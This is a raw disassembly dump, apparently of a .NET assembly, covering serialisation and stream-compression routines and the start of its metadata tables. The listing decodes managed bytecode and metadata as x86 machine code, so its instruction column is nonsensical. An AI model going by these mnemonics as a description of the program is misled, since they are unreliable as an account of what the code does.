  40574b:	08 6f ee             	or     %ch,-0x12(%edi)
  40574e:	00 00                	add    %al,(%eax)
  405750:	0a 07                	or     (%edi),%al
  405752:	28 4a 00             	sub    %cl,0x0(%edx)
  405755:	00 0a                	add    %cl,(%edx)
  405757:	28 58 00             	sub    %bl,0x0(%eax)
  40575a:	00 06                	add    %al,(%esi)
  40575c:	0a 02                	or     (%edx),%al
  40575e:	06                   	push   %es
  40575f:	16                   	push   %ss
  405760:	06                   	push   %es
  405761:	8e 69 6f             	mov    0x6f(%ecx),%gs
  405764:	4c                   	dec    %esp
  405765:	00 00                	add    %al,(%eax)
  405767:	0a 02                	or     (%edx),%al
  405769:	03 16                	add    (%esi),%edx
  40576b:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  405771:	00 0a                	add    %cl,(%edx)
  405773:	2a 13                	sub    (%ebx),%dl
  405775:	30 04 00             	xor    %al,(%eax,%eax,1)
  405778:	21 00                	and    %eax,(%eax)
  40577a:	00 00                	add    %al,(%eax)
  40577c:	29 00                	sub    %eax,(%eax)
  40577e:	00 11                	add    %dl,(%ecx)
  405780:	02 20                	add    (%eax),%ah
  405782:	cf                   	iret
  405783:	00 00                	add    %al,(%eax)
  405785:	00 6f ee             	add    %ch,-0x12(%edi)
  405788:	00 00                	add    %al,(%eax)
  40578a:	0a 03                	or     (%ebx),%al
  40578c:	28 09                	sub    %cl,(%ecx)
  40578e:	01 00                	add    %eax,(%eax)
  405790:	0a 0a                	or     (%edx),%cl
  405792:	02 06                	add    (%esi),%al
  405794:	28 58 00             	sub    %bl,0x0(%eax)
  405797:	00 06                	add    %al,(%esi)
  405799:	16                   	push   %ss
  40579a:	1e                   	push   %ds
  40579b:	6f                   	outsl  %ds:(%esi),(%dx)
  40579c:	4c                   	dec    %esp
  40579d:	00 00                	add    %al,(%eax)
  40579f:	0a 2a                	or     (%edx),%ch
  4057a1:	00 00                	add    %al,(%eax)
  4057a3:	00 13                	add    %dl,(%ebx)
  4057a5:	30 04 00             	xor    %al,(%eax,%eax,1)
  4057a8:	35 01 00 00 00       	xor    $0x1,%eax
  4057ad:	00 00                	add    %al,(%eax)
  4057af:	00 03                	add    %al,(%ebx)
  4057b1:	16                   	push   %ss
  4057b2:	6a 3f                	push   $0x3f
  4057b4:	96                   	xchg   %eax,%esi
  4057b5:	00 00                	add    %al,(%eax)
  4057b7:	00 03                	add    %al,(%ebx)
  4057b9:	1f                   	pop    %ds
  4057ba:	7f 6a                	jg     0x405826
  4057bc:	3d 09 00 00 00       	cmp    $0x9,%eax
  4057c1:	02 03                	add    (%ebx),%al
  4057c3:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4057c6:	00 00                	add    %al,(%eax)
  4057c8:	0a 2a                	or     (%edx),%ch
  4057ca:	03 20                	add    (%eax),%esp
  4057cc:	ff 00                	incl   (%eax)
  4057ce:	00 00                	add    %al,(%eax)
  4057d0:	6a 3d                	push   $0x3d
  4057d2:	14 00                	adc    $0x0,%al
  4057d4:	00 00                	add    %al,(%eax)
  4057d6:	02 20                	add    (%eax),%ah
  4057d8:	cc                   	int3
  4057d9:	00 00                	add    %al,(%eax)
  4057db:	00 6f ee             	add    %ch,-0x12(%edi)
  4057de:	00 00                	add    %al,(%eax)
  4057e0:	0a 02                	or     (%edx),%al
  4057e2:	03 d2                	add    %edx,%edx
  4057e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4057e5:	ee                   	out    %al,(%dx)
  4057e6:	00 00                	add    %al,(%eax)
  4057e8:	0a 2a                	or     (%edx),%ch
  4057ea:	03 20                	add    (%eax),%esp
  4057ec:	ff                   	(bad)
  4057ed:	ff 00                	incl   (%eax)
  4057ef:	00 6a 3d             	add    %ch,0x3d(%edx)
  4057f2:	1b 00                	sbb    (%eax),%eax
  4057f4:	00 00                	add    %al,(%eax)
  4057f6:	02 20                	add    (%eax),%ah
  4057f8:	cd 00                	int    $0x0
  4057fa:	00 00                	add    %al,(%eax)
  4057fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4057fd:	ee                   	out    %al,(%dx)
  4057fe:	00 00                	add    %al,(%eax)
  405800:	0a 02                	or     (%edx),%al
  405802:	03 68 28             	add    0x28(%eax),%ebp
  405805:	5b                   	pop    %ebx
  405806:	00 00                	add    %al,(%eax)
  405808:	06                   	push   %es
  405809:	16                   	push   %ss
  40580a:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  40580d:	00 00                	add    %al,(%eax)
  40580f:	0a 2a                	or     (%edx),%ch
  405811:	03 15 6e 3d 1b 00    	add    0x1b3d6e,%edx
  405817:	00 00                	add    %al,(%eax)
  405819:	02 20                	add    (%eax),%ah
  40581b:	ce                   	into
  40581c:	00 00                	add    %al,(%eax)
  40581e:	00 6f ee             	add    %ch,-0x12(%edi)
  405821:	00 00                	add    %al,(%eax)
  405823:	0a 02                	or     (%edx),%al
  405825:	03 69 28             	add    0x28(%ecx),%ebp
  405828:	5a                   	pop    %edx
  405829:	00 00                	add    %al,(%eax)
  40582b:	06                   	push   %es
  40582c:	16                   	push   %ss
  40582d:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  405830:	00 00                	add    %al,(%eax)
  405832:	0a 2a                	or     (%edx),%ch
  405834:	02 20                	add    (%eax),%ah
  405836:	d3 00                	roll   %cl,(%eax)
  405838:	00 00                	add    %al,(%eax)
  40583a:	6f                   	outsl  %ds:(%esi),(%dx)
  40583b:	ee                   	out    %al,(%dx)
  40583c:	00 00                	add    %al,(%eax)
  40583e:	0a 02                	or     (%edx),%al
  405840:	03 28                	add    (%eax),%ebp
  405842:	59                   	pop    %ecx
  405843:	00 00                	add    %al,(%eax)
  405845:	06                   	push   %es
  405846:	16                   	push   %ss
  405847:	1e                   	push   %ds
  405848:	6f                   	outsl  %ds:(%esi),(%dx)
  405849:	4c                   	dec    %esp
  40584a:	00 00                	add    %al,(%eax)
  40584c:	0a 2a                	or     (%edx),%ch
  40584e:	03 20                	add    (%eax),%esp
  405850:	00 00                	add    %al,(%eax)
  405852:	00 80 6a 3d 1a 00    	add    %al,0x1a3d6a(%eax)
  405858:	00 00                	add    %al,(%eax)
  40585a:	02 20                	add    (%eax),%ah
  40585c:	d3 00                	roll   %cl,(%eax)
  40585e:	00 00                	add    %al,(%eax)
  405860:	6f                   	outsl  %ds:(%esi),(%dx)
  405861:	ee                   	out    %al,(%dx)
  405862:	00 00                	add    %al,(%eax)
  405864:	0a 02                	or     (%edx),%al
  405866:	03 28                	add    (%eax),%ebp
  405868:	59                   	pop    %ecx
  405869:	00 00                	add    %al,(%eax)
  40586b:	06                   	push   %es
  40586c:	16                   	push   %ss
  40586d:	1e                   	push   %ds
  40586e:	6f                   	outsl  %ds:(%esi),(%dx)
  40586f:	4c                   	dec    %esp
  405870:	00 00                	add    %al,(%eax)
  405872:	0a 2a                	or     (%edx),%ch
  405874:	03 20                	add    (%eax),%esp
  405876:	00 80 ff ff 6a 3d    	add    %al,0x3d6affff(%eax)
  40587c:	1b 00                	sbb    (%eax),%eax
  40587e:	00 00                	add    %al,(%eax)
  405880:	02 20                	add    (%eax),%ah
  405882:	d2 00                	rolb   %cl,(%eax)
  405884:	00 00                	add    %al,(%eax)
  405886:	6f                   	outsl  %ds:(%esi),(%dx)
  405887:	ee                   	out    %al,(%dx)
  405888:	00 00                	add    %al,(%eax)
  40588a:	0a 02                	or     (%edx),%al
  40588c:	03 69 28             	add    0x28(%ecx),%ebp
  40588f:	5a                   	pop    %edx
  405890:	00 00                	add    %al,(%eax)
  405892:	06                   	push   %es
  405893:	16                   	push   %ss
  405894:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  405897:	00 00                	add    %al,(%eax)
  405899:	0a 2a                	or     (%edx),%ch
  40589b:	03 1f                	add    (%edi),%ebx
  40589d:	80 6a 3d 1b          	subb   $0x1b,0x3d(%edx)
  4058a1:	00 00                	add    %al,(%eax)
  4058a3:	00 02                	add    %al,(%edx)
  4058a5:	20 d1                	and    %dl,%cl
  4058a7:	00 00                	add    %al,(%eax)
  4058a9:	00 6f ee             	add    %ch,-0x12(%edi)
  4058ac:	00 00                	add    %al,(%eax)
  4058ae:	0a 02                	or     (%edx),%al
  4058b0:	03 68 28             	add    0x28(%eax),%ebp
  4058b3:	5b                   	pop    %ebx
  4058b4:	00 00                	add    %al,(%eax)
  4058b6:	06                   	push   %es
  4058b7:	16                   	push   %ss
  4058b8:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  4058bb:	00 00                	add    %al,(%eax)
  4058bd:	0a 2a                	or     (%edx),%ch
  4058bf:	03 1f                	add    (%edi),%ebx
  4058c1:	e0 6a                	loopne 0x40592d
  4058c3:	3d 14 00 00 00       	cmp    $0x14,%eax
  4058c8:	02 20                	add    (%eax),%ah
  4058ca:	d0 00                	rolb   $1,(%eax)
  4058cc:	00 00                	add    %al,(%eax)
  4058ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4058cf:	ee                   	out    %al,(%dx)
  4058d0:	00 00                	add    %al,(%eax)
  4058d2:	0a 02                	or     (%edx),%al
  4058d4:	03 d2                	add    %edx,%edx
  4058d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4058d7:	ee                   	out    %al,(%dx)
  4058d8:	00 00                	add    %al,(%eax)
  4058da:	0a 2a                	or     (%edx),%ch
  4058dc:	02 03                	add    (%ebx),%al
  4058de:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4058e1:	00 00                	add    %al,(%eax)
  4058e3:	0a 2a                	or     (%edx),%ch
  4058e5:	00 00                	add    %al,(%eax)
  4058e7:	00 1b                	add    %bl,(%ebx)
  4058e9:	30 04 00             	xor    %al,(%eax,%eax,1)
  4058ec:	61                   	popa
  4058ed:	00 00                	add    %al,(%eax)
  4058ef:	00 2d 00 00 11 02    	add    %ch,0x2110000
  4058f5:	73 4d                	jae    0x405944
  4058f7:	00 00                	add    %al,(%eax)
  4058f9:	0a 0a                	or     (%edx),%cl
  4058fb:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  405901:	0b 06                	or     (%esi),%eax
  405903:	07                   	pop    %es
  405904:	16                   	push   %ss
  405905:	1a 6f 45             	sbb    0x45(%edi),%ch
  405908:	00 00                	add    %al,(%eax)
  40590a:	0a 26                	or     (%esi),%ah
  40590c:	07                   	pop    %es
  40590d:	16                   	push   %ss
  40590e:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  405912:	0a 0c 06             	or     (%esi,%eax,1),%cl
  405915:	16                   	push   %ss
  405916:	73 0a                	jae    0x405922
  405918:	01 00                	add    %eax,(%eax)
  40591a:	0a 0d 08 8d 44 00    	or     0x448d08,%cl
  405920:	00 01                	add    %al,(%ecx)
  405922:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  405925:	11 04 16             	adc    %eax,(%esi,%edx,1)
  405928:	08 6f 45             	or     %ch,0x45(%edi)
  40592b:	00 00                	add    %al,(%eax)
  40592d:	0a 26                	or     (%esi),%ah
  40592f:	11 04 13             	adc    %eax,(%ebx,%edx,1)
  405932:	05 dd 1a 00 00       	add    $0x1add,%eax
  405937:	00 09                	add    %cl,(%ecx)
  405939:	39 06                	cmp    %eax,(%esi)
  40593b:	00 00                	add    %al,(%eax)
  40593d:	00 09                	add    %cl,(%ecx)
  40593f:	6f                   	outsl  %ds:(%esi),(%dx)
  405940:	33 00                	xor    (%eax),%eax
  405942:	00 0a                	add    %cl,(%edx)
  405944:	dc 06                	faddl  (%esi)
  405946:	39 06                	cmp    %eax,(%esi)
  405948:	00 00                	add    %al,(%eax)
  40594a:	00 06                	add    %al,(%esi)
  40594c:	6f                   	outsl  %ds:(%esi),(%dx)
  40594d:	33 00                	xor    (%eax),%eax
  40594f:	00 0a                	add    %cl,(%edx)
  405951:	dc 11                	fcoml  (%ecx)
  405953:	05 2a 00 00 00       	add    $0x2a,%eax
  405958:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  40595b:	00 02                	add    %al,(%edx)
  40595d:	00 28                	add    %ch,(%eax)
  40595f:	00 1c 44             	add    %bl,(%esp,%eax,2)
  405962:	00 0d 00 00 00 00    	add    %cl,0x0
  405968:	02 00                	add    (%eax),%al
  40596a:	07                   	pop    %es
  40596b:	00 4a 51             	add    %cl,0x51(%edx)
  40596e:	00 0d 00 00 00 00    	add    %cl,0x0
  405974:	1b 30                	sbb    (%eax),%esi
  405976:	04 00                	add    $0x0,%al
  405978:	5e                   	pop    %esi
  405979:	00 00                	add    %al,(%eax)
  40597b:	00 2e                	add    %ch,(%esi)
  40597d:	00 00                	add    %al,(%eax)
  40597f:	11 73 d0             	adc    %esi,-0x30(%ebx)
  405982:	00 00                	add    %al,(%eax)
  405984:	0a 0a                	or     (%edx),%cl
  405986:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  40598c:	00 0a                	add    %cl,(%edx)
  40598e:	0b 06                	or     (%esi),%eax
  405990:	07                   	pop    %es
  405991:	16                   	push   %ss
  405992:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  405995:	00 00                	add    %al,(%eax)
  405997:	0a 06                	or     (%esi),%al
  405999:	17                   	pop    %ss
  40599a:	73 0a                	jae    0x4059a6
  40599c:	01 00                	add    %eax,(%eax)
  40599e:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4059a1:	02 16                	add    (%esi),%dl
  4059a3:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  4059a9:	00 0a                	add    %cl,(%edx)
  4059ab:	08 6f 4f             	or     %ch,0x4f(%edi)
  4059ae:	00 00                	add    %al,(%eax)
  4059b0:	0a dd                	or     %ch,%bl
  4059b2:	0d 00 00 00 08       	or     $0x8000000,%eax
  4059b7:	39 06                	cmp    %eax,(%esi)
  4059b9:	00 00                	add    %al,(%eax)
  4059bb:	00 08                	add    %cl,(%eax)
  4059bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4059be:	33 00                	xor    (%eax),%eax
  4059c0:	00 0a                	add    %cl,(%edx)
  4059c2:	dc 06                	faddl  (%esi)
  4059c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4059c5:	dd 00                	fldl   (%eax)
  4059c7:	00 0a                	add    %cl,(%edx)
  4059c9:	0d dd 0d 00 00       	or     $0xddd,%eax
  4059ce:	00 06                	add    %al,(%esi)
  4059d0:	39 06                	cmp    %eax,(%esi)
  4059d2:	00 00                	add    %al,(%eax)
  4059d4:	00 06                	add    %al,(%esi)
  4059d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4059d7:	33 00                	xor    (%eax),%eax
  4059d9:	00 0a                	add    %cl,(%edx)
  4059db:	dc 09                	fmull  (%ecx)
  4059dd:	2a 00                	sub    (%eax),%al
  4059df:	00 01                	add    %al,(%ecx)
  4059e1:	1c 00                	sbb    $0x0,%al
  4059e3:	00 02                	add    %al,(%edx)
  4059e5:	00 20                	add    %ah,(%eax)
  4059e7:	00 16                	add    %dl,(%esi)
  4059e9:	36 00 0d 00 00 00 00 	add    %cl,%ss:0x0
  4059f0:	02 00                	add    (%eax),%al
  4059f2:	06                   	push   %es
  4059f3:	00 49 4f             	add    %cl,0x4f(%ecx)
  4059f6:	00 0d 00 00 00 00    	add    %cl,0x0
  4059fc:	42                   	inc    %edx
  4059fd:	53                   	push   %ebx
  4059fe:	4a                   	dec    %edx
  4059ff:	42                   	inc    %edx
  405a00:	01 00                	add    %eax,(%eax)
  405a02:	01 00                	add    %eax,(%eax)
  405a04:	00 00                	add    %al,(%eax)
  405a06:	00 00                	add    %al,(%eax)
  405a08:	0c 00                	or     $0x0,%al
  405a0a:	00 00                	add    %al,(%eax)
  405a0c:	76 34                	jbe    0x405a42
  405a0e:	2e 30 2e             	xor    %ch,%cs:(%esi)
  405a11:	33 30                	xor    (%eax),%esi
  405a13:	33 31                	xor    (%ecx),%esi
  405a15:	39 00                	cmp    %eax,(%eax)
  405a17:	00 00                	add    %al,(%eax)
  405a19:	00 05 00 6c 00 00    	add    %al,0x6c00
  405a1f:	00 bc 1d 00 00 23 7e 	add    %bh,0x7e230000(%ebp,%ebx,1)
  405a26:	00 00                	add    %al,(%eax)
  405a28:	28 1e                	sub    %bl,(%esi)
  405a2a:	00 00                	add    %al,(%eax)
  405a2c:	c0 1d 00 00 23 53 74 	rcrb   $0x74,0x53230000
  405a33:	72 69                	jb     0x405a9e
  405a35:	6e                   	outsb  %ds:(%esi),(%dx)
  405a36:	67 73 00             	addr16 jae 0x405a39
  405a39:	00 00                	add    %al,(%eax)
  405a3b:	00 e8                	add    %ch,%al
  405a3d:	3b 00                	cmp    (%eax),%eax
  405a3f:	00 c8                	add    %cl,%al
  405a41:	27                   	daa
  405a42:	00 00                	add    %al,(%eax)
  405a44:	23 55 53             	and    0x53(%ebp),%edx
  405a47:	00 b0 63 00 00 10    	add    %dh,0x10000063(%eax)
  405a4d:	00 00                	add    %al,(%eax)
  405a4f:	00 23                	add    %ah,(%ebx)
  405a51:	47                   	inc    %edi
  405a52:	55                   	push   %ebp
  405a53:	49                   	dec    %ecx
  405a54:	44                   	inc    %esp
  405a55:	00 00                	add    %al,(%eax)
  405a57:	00 c0                	add    %al,%al
  405a59:	63 00                	arpl   %eax,(%eax)
  405a5b:	00 40 09             	add    %al,0x9(%eax)
  405a5e:	00 00                	add    %al,(%eax)
  405a60:	23 42 6c             	and    0x6c(%edx),%eax
  405a63:	6f                   	outsl  %ds:(%esi),(%dx)
  405a64:	62 00                	bound  %eax,(%eax)
  405a66:	00 00                	add    %al,(%eax)
  405a68:	00 00                	add    %al,(%eax)
  405a6a:	00 00                	add    %al,(%eax)
  405a6c:	02 00                	add    (%eax),%al
  405a6e:	00 01                	add    %al,(%ecx)
  405a70:	57                   	push   %edi
  405a71:	9f                   	lahf
  405a72:	a2 3f 09 0a 00       	mov    %al,0xa093f
  405a77:	00 00                	add    %al,(%eax)
  405a79:	fa                   	cli
  405a7a:	25 33 00 16 00       	and    $0x160033,%eax
  405a7f:	00 01                	add    %al,(%ecx)
  405a81:	00 00                	add    %al,(%eax)
  405a83:	00 9b 00 00 00 1e    	add    %bl,0x1e000000(%ebx)
  405a89:	00 00                	add    %al,(%eax)
  405a8b:	00 47 00             	add    %al,0x0(%edi)
  405a8e:	00 00                	add    %al,(%eax)
  405a90:	a3 00 00 00 71       	mov    %eax,0x71000000
  405a95:	00 00                	add    %al,(%eax)
  405a97:	00 02                	add    %al,(%edx)
  405a99:	00 00                	add    %al,(%eax)
  405a9b:	00 0a                	add    %cl,(%edx)
  405a9d:	01 00                	add    %eax,(%eax)
  405a9f:	00 13                	add    %dl,(%ebx)
  405aa1:	00 00                	add    %al,(%eax)
  405aa3:	00 31                	add    %dh,(%ecx)
  405aa5:	00 00                	add    %al,(%eax)
  405aa7:	00 02                	add    %al,(%edx)
  405aa9:	00 00                	add    %al,(%eax)
  405aab:	00 2e                	add    %ch,(%esi)
  405aad:	00 00                	add    %al,(%eax)
  405aaf:	00 04 00             	add    %al,(%eax,%eax,1)
  405ab2:	00 00                	add    %al,(%eax)
  405ab4:	13 00                	adc    (%eax),%eax
  405ab6:	00 00                	add    %al,(%eax)
  405ab8:	20 00                	and    %al,(%eax)
  405aba:	00 00                	add    %al,(%eax)
  405abc:	04 00                	add    $0x0,%al
  405abe:	00 00                	add    %al,(%eax)
  405ac0:	03 00                	add    (%eax),%eax
  405ac2:	00 00                	add    %al,(%eax)
  405ac4:	06                   	push   %es
  405ac5:	00 00                	add    %al,(%eax)
  405ac7:	00 06                	add    %al,(%esi)
  405ac9:	00 00                	add    %al,(%eax)
  405acb:	00 02                	add    %al,(%edx)
  405acd:	00 00                	add    %al,(%eax)
  405acf:	00 01                	add    %al,(%ecx)
  405ad1:	00 00                	add    %al,(%eax)
  405ad3:	00 08                	add    %cl,(%eax)
  405ad5:	00 00                	add    %al,(%eax)
  405ad7:	00 04 00             	add    %al,(%eax,%eax,1)
  405ada:	00 00                	add    %al,(%eax)
  405adc:	01 00                	add    %eax,(%eax)
  405ade:	00 00                	add    %al,(%eax)
  405ae0:	00 00                	add    %al,(%eax)
  405ae2:	f4                   	hlt
  405ae3:	0a 01                	or     (%ecx),%al
  405ae5:	00 00                	add    %al,(%eax)
  405ae7:	00 00                	add    %al,(%eax)
  405ae9:	00 06                	add    %al,(%esi)
  405aeb:	00 41 19             	add    %al,0x19(%ecx)
  405aee:	f6 0f 0a             	testb  $0xa,(%edi)
  405af1:	00 8a 00 0b 16 0a    	add    %cl,0xa160b00(%edx)
  405af7:	00 a7 19 7a 18 0a    	add    %ah,0xa187a19(%edi)
  405afd:	00 91 0f 8d 1d 06    	add    %dl,0x61d8d0f(%ecx)
  405b03:	00 31                	add    %dh,(%ecx)
  405b05:	14 a0                	adc    $0xa0,%al
  405b07:	0b 06                	or     (%esi),%eax
  405b09:	00 87 08 0b 16 0a    	add    %al,0xa160b08(%edi)
  405b0f:	00 aa 10 0b 16 0a    	add    %ch,0xa160b10(%edx)
  405b15:	00 16                	add    %dl,(%esi)
  405b17:	18 8d 1d 06 00 01    	sbb    %cl,0x100061d(%ebp)
  405b1d:	1a f6                	sbb    %dh,%dh
  405b1f:	0f 0e                	femms
  405b21:	00 0d 12 f7 0b 0e    	add    %cl,0xe0bf712
  405b27:	00 cc                	add    %cl,%ah
  405b29:	18 f7                	sbb    %dh,%bh
  405b2b:	0b 06                	or     (%esi),%eax
  405b2d:	00 46 1c             	add    %al,0x1c(%esi)
  405b30:	a0 0b 06 00 31       	mov    0x3100060b,%al
  405b35:	13 e7                	adc    %edi,%esp
  405b37:	1b 06                	sbb    (%esi),%eax
  405b39:	00 67 10             	add    %ah,0x10(%edi)
  405b3c:	f6 0f 0a             	testb  $0xa,(%edi)
  405b3f:	00 22                	add    %ah,(%edx)
  405b41:	17                   	pop    %ss
  405b42:	55                   	push   %ebp
  405b43:	00 06                	add    %al,(%esi)
  405b45:	00 2b                	add    %ch,(%ebx)
  405b47:	00 cb                	add    %cl,%bl
  405b49:	02 12                	add    (%edx),%dl
  405b4b:	00 20                	add    %ah,(%eax)
  405b4d:	00 a3 15 12 00 01    	add    %ah,0x1001215(%ebx)
  405b53:	00 f6                	add    %dh,%dh
  405b55:	0f 12 00             	movlps (%eax),%xmm0
  405b58:	e3 08                	jecxz  0x405b62
  405b5a:	a3 15 06 00 02       	mov    %eax,0x2000615
  405b5f:	08 f6                	or     %dh,%dh
  405b61:	0f 06                	clts
  405b63:	00 ea                	add    %ch,%dl
  405b65:	0b e7                	or     %edi,%esp
  405b67:	1b 06                	sbb    (%esi),%eax
  405b69:	00 ab 14 d0 17 06    	add    %ch,0x617d014(%ebx)
  405b6f:	00 a6 05 d0 17 06    	add    %ah,0x617d005(%esi)
  405b75:	00 ca                	add    %cl,%dl
  405b77:	0f 66 02             	pcmpgtd (%edx),%mm0
  405b7a:	06                   	push   %es
  405b7b:	00 f0                	add    %dh,%al
  405b7d:	09 a3 15 06 00 5d    	or     %esp,0x5d000615(%ebx)
  405b83:	0a a3 15 06 00 0d    	or     0xd000615(%ebx),%ah
  405b89:	09 45 15             	or     %eax,0x15(%ebp)
  405b8c:	6f                   	outsl  %ds:(%esi),(%dx)
  405b8d:	00 c3                	add    %al,%bl
  405b8f:	15 00 00 06 00       	adc    $0x60000,%eax
  405b94:	35 09 57 11 06       	xor    $0x6115709,%eax
  405b99:	00 bc 09 57 11 06 00 	add    %bh,0x61157(%ecx,%ecx,1)
  405ba0:	9d                   	popf
  405ba1:	09 57 11             	or     %edx,0x11(%edi)
  405ba4:	06                   	push   %es
  405ba5:	00 44 0a 57          	add    %al,0x57(%edx,%ecx,1)
  405ba9:	11 06                	adc    %eax,(%esi)
  405bab:	00 10                	add    %dl,(%eax)
  405bad:	0a 57 11             	or     0x11(%edi),%dl
  405bb0:	06                   	push   %es
  405bb1:	00 29                	add    %ch,(%ecx)
  405bb3:	0a 57 11             	or     0x11(%edi),%dl
  405bb6:	06                   	push   %es
  405bb7:	00 4c 09 57          	add    %cl,0x57(%ecx,%ecx,1)
  405bbb:	11 06                	adc    %eax,(%esi)
  405bbd:	00 80 09 57 11 06    	add    %al,0x6115709(%eax)
  405bc3:	00 67 09             	add    %ah,0x9(%edi)
  405bc6:	0e                   	push   %cs
  405bc7:	0c 06                	or     $0x6,%al
  405bc9:	00 21                	add    %ah,(%ecx)
  405bcb:	09 84 15 06 00 f2 08 	or     %eax,0x8f20006(%ebp,%edx,1)
  405bd2:	a3 15 06 00 d9       	mov    %eax,0xd9000615
  405bd7:	09 57 11             	or     %edx,0x11(%edi)
  405bda:	06                   	push   %es
  405bdb:	00 1b                	add    %bl,(%ebx)
  405bdd:	03 a0 0b 06 00 a1    	add    -0x5efff9f5(%eax),%esp
  405be3:	1b f6                	sbb    %esi,%esi
  405be5:	0f 06                	clts
  405be7:	00 99 1a f6 0f 06    	add    %bl,0x60ff61a(%ecx)
  405bed:	00 ee                	add    %ch,%dh
  405bef:	0b e7                	or     %edi,%esp
  405bf1:	1b 0a                	sbb    (%edx),%ecx
  405bf3:	00 d2                	add    %dl,%dl
  405bf5:	1c 0b                	sbb    $0xb,%al
  405bf7:	16                   	push   %ss
  405bf8:	06                   	push   %es
  405bf9:	00 21                	add    %ah,(%ecx)
  405bfb:	10 00                	adc    %al,(%eax)
  405bfd:	1d 06 00 ff 12       	sbb    $0x12ff0006,%eax
  405c02:	00 1d 06 00 81 0b    	add    %bl,0xb810006
  405c08:	00 1d 06 00 fb 11    	add    %bl,0x11fb0006
  405c0e:	f6 0f 0a             	testb  $0xa,(%edi)
  405c11:	00 5c 18 66          	add    %bl,0x66(%eax,%ebx,1)
  405c15:	19 0a                	sbb    %ecx,(%edx)
  405c17:	00 1f                	add    %bl,(%edi)
  405c19:	1a 66 19             	sbb    0x19(%esi),%ah
  405c1c:	0a 00                	or     (%eax),%al
  405c1e:	ae                   	scas   %es:(%edi),%al
  405c1f:	0e                   	push   %cs
  405c20:	66 19 0a             	sbb    %cx,(%edx)
  405c23:	00 26                	add    %ah,(%esi)
  405c25:	1d 7a 18 0a 00       	sbb    $0xa187a,%eax
  405c2a:	37                   	aaa
  405c2b:	08 7a 18             	or     %bh,0x18(%edx)
  405c2e:	0a 00                	or     (%eax),%al
  405c30:	22 08                	and    (%eax),%cl
  405c32:	7a 18                	jp     0x405c4c
  405c34:	06                   	push   %es
  405c35:	00 cb                	add    %cl,%bl
  405c37:	0c f6                	or     $0xf6,%al
  405c39:	0f 06                	clts
  405c3b:	00 d4                	add    %dl,%ah
  405c3d:	12 f6                	adc    %dh,%dh
  405c3f:	0f 06                	clts
  405c41:	00 48 10             	add    %cl,0x10(%eax)
  405c44:	f6 0f 0a             	testb  $0xa,(%edi)
  405c47:	00 c3                	add    %al,%bl
  405c49:	17                   	pop    %ss
  405c4a:	66 19 0a             	sbb    %cx,(%edx)
  405c4d:	00 5d 17             	add    %bl,0x17(%ebp)
  405c50:	66 19 06             	sbb    %ax,(%esi)
  405c53:	00 e3                	add    %ah,%bl
  405c55:	17                   	pop    %ss
  405c56:	f6 0f 06             	testb  $0x6,(%edi)
  405c59:	00 b2 05 f6 0f 0a    	add    %dh,0xa0ff605(%edx)
  405c5f:	00 83 0f 7a 18 0a    	add    %al,0xa187a0f(%ebx)
  405c65:	00 f8                	add    %bh,%al
  405c67:	0d 8d 1d 0a 00       	or     $0xa1d8d,%eax
  405c6c:	40                   	inc    %eax
  405c6d:	1b 66 19             	sbb    0x19(%esi),%esp
  405c70:	0a 00                	or     (%eax),%al
  405c72:	69 11 0b 16 0a 00    	imul   $0xa160b,(%ecx),%edx
  405c78:	81 17 38 11 06 00    	adcl   $0x61138,(%edi)
  405c7e:	9d                   	popf
  405c7f:	0a f6                	or     %dh,%dh
  405c81:	0f 06                	clts
  405c83:	00 1c 0e             	add    %bl,(%esi,%ecx,1)
  405c86:	a0 0b 06 00 ea       	mov    0xea00060b,%al
  405c8b:	0d f6 0f 0a 00       	or     $0xa0ff6,%eax
  405c90:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405c91:	0d f6 0f 0a 00       	or     $0xa0ff6,%eax
  405c96:	ee                   	out    %al,(%dx)
  405c97:	07                   	pop    %es
  405c98:	f6 0f 06             	testb  $0x6,(%edi)
  405c9b:	00 90 14 f6 0f 06    	add    %dl,0x60ff614(%eax)
  405ca1:	00 88 1b a0 0b 06    	add    %cl,0x60ba01b(%eax)
  405ca7:	00 c4                	add    %al,%ah
  405ca9:	0f 66 02             	pcmpgtd (%edx),%mm0
  405cac:	06                   	push   %es
  405cad:	00 16                	add    %dl,(%esi)
  405caf:	15 a0 0b 0a 00       	adc    $0xa0ba0,%eax
  405cb4:	5c                   	pop    %esp
  405cb5:	05 7a 18 06 00       	add    $0x6187a,%eax
  405cba:	c2 01 f6             	ret    $0xf601
  405cbd:	0f 06                	clts
  405cbf:	00 25 12 66 02 0a    	add    %ah,0xa026612
  405cc5:	00 54 18 45          	add    %dl,0x45(%eax,%ebx,1)
  405cc9:	15 0a 00 67 12       	adc    $0x1267000a,%eax
  405cce:	45                   	inc    %ebp
  405ccf:	15 06 00 ef 1c       	adc    $0x1cef0006,%eax
  405cd4:	55                   	push   %ebp
  405cd5:	00 06                	add    %al,(%esi)
  405cd7:	00 72 14             	add    %dh,0x14(%edx)
  405cda:	66 02 06             	data16 add (%esi),%al
  405cdd:	00 6a 0d             	add    %ch,0xd(%edx)
  405ce0:	66 02 0a             	data16 add (%edx),%cl
  405ce3:	00 bb 06 45 15 06    	add    %bh,0x6154506(%ebx)
  405ce9:	00 38                	add    %bh,(%eax)
  405ceb:	12 66 02             	adc    0x2(%esi),%ah
  405cee:	0a 00                	or     (%eax),%al
  405cf0:	d9 06                	flds   (%esi)
  405cf2:	45                   	inc    %ebp
